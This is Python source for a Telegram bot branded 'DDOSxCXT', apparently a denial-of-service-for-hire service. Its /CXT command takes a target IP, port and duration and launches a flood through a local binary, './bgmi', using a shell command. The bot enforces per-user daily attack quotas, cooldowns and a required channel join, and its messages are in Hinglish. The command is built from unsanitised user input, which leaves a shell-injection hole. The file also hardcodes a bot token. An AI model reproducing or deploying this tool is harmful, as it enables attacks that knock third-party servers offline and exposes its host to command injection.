import telebot
import datetime
import time
import subprocess
import threading

from keep_alive import keep_alive
keep_alive()
# Insert your Telegram bot token here
bot = telebot.TeleBot('7652184022:AAE4amu3tB2UFTfXsdsptBVae-IK3taYhjg')

# Admin user IDs
admin_id = ["930577300"]

# Group and channel details
GROUP_ID = "-1002313960365"
CHANNEL_USERNAME = "@DDOSxCXT"

# Default cooldown and attack limits
COOLDOWN_TIME = 10  # Cooldown in seconds
ATTACK_LIMIT = 15  # Max attacks per day

# Files to store user data
USER_FILE = "users.txt"

# Dictionary to store user states
user_data = {}
global_last_attack_time = None  # Global cooldown tracker

# Function to load user data from the file
def load_users():
    try:
        with open(USER_FILE, "r") as file:
            for line in file:
                user_id, attacks, last_reset = line.strip().split(',')
                user_data[user_id] = {
                    'attacks': int(attacks),
                    'last_reset': datetime.datetime.fromisoformat(last_reset),
                    'last_attack': None
                }
    except FileNotFoundError:
        pass

# Function to save user data to the file
def save_users():
    with open(USER_FILE, "w") as file:
        for user_id, data in user_data.items():
            file.write(f"{user_id},{data['attacks']},{data['last_reset'].isoformat()}\n")

# Middleware to ensure users are joined to the channel
def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

# Command to handle attacks
@bot.message_handler(commands=['CXT'])
def handle_attack(message):
    global global_last_attack_time
    user_id = str(message.from_user.id)

    # Ensure user is in the group
    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, "𝗞𝗬𝗔 𝗥𝗘 𝗟𝗢𝗪𝗗𝗘 𝗬𝗘 𝗕𝗢𝗧 𝗕𝗔𝗦 𝗜𝗦 𝗚𝗥𝗢𝗨𝗣 𝗠𝗔𝗜 𝗖𝗛𝗔𝗟𝗘𝗚𝗔. 𝗝𝗢𝗜𝗡 - https://t.me/DDOSxCXT")
        return

    # Ensure user is a member of the channel
    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"𝗬𝗲 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗷𝗼𝗶𝗻 𝗸𝗮𝗿 {CHANNEL_USERNAME} 𝘁𝗮𝗯𝗵𝗶 𝘂𝘀𝗲 𝗸𝗮𝗿𝗽𝗮𝘆𝗴𝗮.")
        return

    # Check global cooldown
    if global_last_attack_time and (datetime.datetime.now() - global_last_attack_time).seconds < COOLDOWN_TIME:
        remaining_time = COOLDOWN_TIME - (datetime.datetime.now() - global_last_attack_time).seconds
        bot.reply_to(message, f"𝗔𝗕𝗛𝗜 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗚𝗔 𝗛𝗨𝗔 𝗛𝗔𝗜. 𝗜𝗡𝗧𝗔𝗝𝗔𝗥 𝗞𝗥𝗘 {remaining_time} 𝗦𝗲𝗰𝗼𝗻𝗱𝘀.")
        return

    # Initialize user data if not present
    if user_id not in user_data:
        user_data[user_id] = {'attacks': 0, 'last_reset': datetime.datetime.now(), 'last_attack': None}

    user = user_data[user_id]

    # Check user's daily attack limit
    if user['attacks'] >= ATTACK_LIMIT:
        bot.reply_to(message, f"𝗕𝗛𝗔𝗜 𝗧𝗨𝗝𝗛𝗘 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗜𝗠𝗜𝗧 𝗗𝗜𝗔 𝗧𝗛𝗔 15 𝗧𝗨𝗡𝗘 𝗩𝗢 𝗞𝗛𝗔𝗧𝗔𝗠 𝗞𝗥𝗗𝗜𝗔 𝗟𝗜𝗠𝗜𝗧 𝗢𝗙 {ATTACK_LIMIT}. 𝗞𝗔𝗟 𝗔𝗬𝗜𝗢 𝗔𝗕.")
        return

    # Parse command arguments
    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "𝗨𝘀𝗲: /CXT <𝗜𝗽> <𝗣𝗼𝗿𝘁> <𝘀𝗲𝗰>")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "𝗘𝗿𝗿𝗼𝗿: 𝗣𝗼𝗿𝘁 𝗼𝗿 𝘁𝗶𝗺𝗲 𝗺𝘀𝘁 𝗯𝗲 𝗶𝗻𝘁𝗲𝗴𝗲𝗿𝘀.")
        return

    if time_duration > 180:
        bot.reply_to(message, "𝗘𝗿𝗿𝗼𝗿: 𝗔𝘁𝘁𝗮𝗰𝗸 𝟭𝟴𝟬 𝘀𝗲 𝘂𝗽𝗮𝗿 𝗻𝗵𝗶 𝗷𝗮𝘆𝗴𝗮.")
        return

    # Execute the attack via the binary
    full_command = f"./bgmi {target} {port} {time_duration} {500}"
    try:
        bot.reply_to(message, f"𝗔𝘁𝘁𝗮𝗰𝗸 𝘀𝘁𝗮𝗿𝘁 𝗵𝗼𝗴𝘆𝗮 𝗵𝗮 𝗶𝘀𝗽𝗲: {target}, 𝗣𝗼𝗿𝘁: {port}, 𝗧𝗶𝗺𝗲: {time_duration} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀.\n"
                              f"𝗧𝗲𝗿𝗲 𝗮𝘁𝘁𝗮𝗰𝗸 𝗹𝗶𝗺𝗶𝘁 𝗶𝘁𝗻𝗶 𝗵𝗮: {ATTACK_LIMIT - user['attacks'] - 1}")
        subprocess.run(full_command, shell=True)
        bot.reply_to(message, f"𝗧𝗲𝗿𝗮 𝗮𝘁𝘁𝗮𝗰𝗸 𝗸𝗵𝗮𝘁𝗮𝗺 𝗵𝗼𝗴𝘆𝗮 𝗶𝘀𝗽𝗲: {target}, 𝗣𝗼𝗿𝘁: {port}, 𝗧𝗶𝗺𝗲: {time_duration} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀.")
    except Exception as e:
        bot.reply_to(message, f"𝗞𝘂𝗰𝗵 𝗴𝗮𝗹𝘁𝗶 𝗸𝗿𝗶 𝗵𝗮 𝘁𝘂𝗻𝗻𝗲 𝗮𝘁𝘁𝗮𝗰𝗸 𝗺𝗮𝗶: {str(e)}")
        return

    # Update user data and global cooldown
    user['attacks'] += 1
    user['last_attack'] = datetime.datetime.now()
    global_last_attack_time = datetime.datetime.now()
    save_users()

# Command to check global cooldown
@bot.message_handler(commands=['check_cooldown'])
def check_cooldown(message):
    if global_last_attack_time and (datetime.datetime.now() - global_last_attack_time).seconds < COOLDOWN_TIME:
        remaining_time = COOLDOWN_TIME - (datetime.datetime.now() - global_last_attack_time).seconds
        bot.reply_to(message, f"𝗶𝘁𝗻𝗲 𝗰𝗼𝗼𝗹𝗱𝗶𝘄𝗻 𝗿𝗵𝗲𝗴𝘆𝗮: {remaining_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝗿𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴.")
    else:
        bot.reply_to(message, "𝗸𝗼𝗶 𝗴𝗹𝗼𝗯𝗮𝗹 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗻𝗵𝗶 𝗵. 𝘁𝘂 𝗮𝘁𝘁𝘁𝗮𝗰𝗸 𝗹𝗴𝗮 𝘀𝗸𝘁𝗮 𝗵.")

# Command to check remaining attacks for a user
@bot.message_handler(commands=['check_remaining_attack'])
def check_remaining_attack(message):
    user_id = str(message.from_user.id)
    if user_id not in user_data:
        bot.reply_to(message, f"𝗧𝗲𝗿𝗲 𝗶𝘁𝗻𝗲 {ATTACK_LIMIT} 𝗮𝘁𝘁𝗮𝗰𝗸𝘀 𝗹𝗶𝗺𝗶𝘁 𝗵𝗮 𝗮𝗷𝗸𝗶.")
    else:
        remaining_attacks = ATTACK_LIMIT - user_data[user_id]['attacks']
        bot.reply_to(message, f"𝗧𝗲𝗿𝗲 𝗶𝘁𝗻𝗮 {remaining_attacks} 𝗮𝘁𝘁𝗮𝗰𝗸𝘀 𝗿𝗵𝗲𝗴𝘆𝗮 𝗮𝗷 𝗸𝗲.")

# Admin commands
@bot.message_handler(commands=['reset'])
def reset_user(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "𝗬𝗢𝗨𝗥 𝗣𝗔𝗣𝗔 𝗖𝗔𝗡 𝗨𝗦𝗘 𝗧𝗛𝗜𝗦 𝗖𝗢𝗠𝗠𝗔𝗡𝗗.")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "𝗨𝘀𝗮𝗴𝗲: /reset <𝗨𝘀𝗲𝗿_𝗶𝗱>")
        return

    user_id = command[1]
    if user_id in user_data:
        user_data[user_id]['attacks'] = 0
        save_users()
        bot.reply_to(message, f"𝗧𝗘𝗥𝗜 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗜𝗠𝗜𝗧 𝗥𝗘𝗦𝗘𝗧 𝗛𝗢𝗚𝗬𝗔 {user_id} 𝗛𝗔 𝗢𝗪𝗡𝗘𝗥 𝗞𝗘 𝗗𝗨𝗔𝗥𝗔.")
    else:
        bot.reply_to(message, f"𝗞𝗢𝗜 𝗗𝗔𝗧𝗔 𝗡𝗛𝗜 𝗠𝗜𝗟𝗔 𝗨𝗦𝗘𝗥 𝗞𝗔 {user_id}.")

@bot.message_handler(commands=['setcooldown'])
def set_cooldown(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "𝗬𝗢𝗨𝗥 𝗣𝗔𝗣𝗔 𝗖𝗔𝗡 𝗨𝗦𝗘 𝗧𝗛𝗜𝗦 𝗖𝗢𝗠𝗠𝗔𝗡𝗗.")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "𝗨𝘀𝗮𝗴𝗲: /setcooldown <𝘀𝗲𝗰𝗼𝗻𝗱𝘀>")
        return

    global COOLDOWN_TIME
    try:
        COOLDOWN_TIME = int(command[1])
        bot.reply_to(message, f"𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝘁𝗶𝗺𝗲 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝘀𝗲𝘁 {COOLDOWN_TIME} 𝘀𝗲𝗰𝗼𝘂𝗻𝗱𝘀.")
    except ValueError:
        bot.reply_to(message, "𝗽𝗹𝗲𝗮𝘀𝗲 𝗽𝗿𝗼𝘃𝗶𝗱𝗲 𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗯𝗲𝗿 𝗼𝗳 𝘀𝗲𝗰𝗼𝗻𝗱𝘀.")

@bot.message_handler(commands=['viewusers'])
def view_users(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "𝗬𝗢𝗨𝗥 𝗣𝗔𝗣𝗔 𝗖𝗔𝗡 𝗨𝗦𝗘 𝗧𝗛𝗜𝗦 𝗖𝗢𝗠𝗠𝗔𝗡𝗗.")
        return

    user_list = "\n".join([f"𝗨𝘀𝗲𝗿 𝗶𝗱: {user_id}, 𝗮𝘁𝘁𝗮𝗰𝗸𝘀 𝘂𝘀𝗲𝗱: {data['attacks']}, 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴: {ATTACK_LIMIT - data['attacks']}" 
                           for user_id, data in user_data.items()])
    bot.reply_to(message, f"User Summary:\n\n{user_list}")


@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"𝗪𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗗𝗗𝗢𝗦𝘅𝗖𝗫𝗧.\n𝗪𝗢𝗥𝗟𝗗 𝗕𝗘𝗦𝗧 𝗕𝗢𝗧\n𝗜𝗦𝗧𝗔𝗠𝗔𝗟 𝗞𝗥𝗡𝗘 𝗞𝗘 𝗟𝗜𝗔 𝗜𝗦𝗣𝗘 𝗝𝗢𝗜𝗡 𝗛𝗢𝗝𝗔𝗢 https://t.me/DDOSxCXT"
    bot.reply_to(message, response)

# Function to reset daily limits automatically
def auto_reset():
    while True:
        now = datetime.datetime.now()
        seconds_until_midnight = ((24 - now.hour - 1) * 3600) + ((60 - now.minute - 1) * 60) + (60 - now.second)
        time.sleep(seconds_until_midnight)
        for user_id in user_data:
            user_data[user_id]['attacks'] = 0
            user_data[user_id]['last_reset'] = datetime.datetime.now()
        save_users()

# Start auto-reset in a separate thread
reset_thread = threading.Thread(target=auto_reset, daemon=True)
reset_thread.start()

# Load user data on startup
load_users()


#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
        # Add a small delay to avoid rapid looping in case of persistent errors
        time.sleep(15)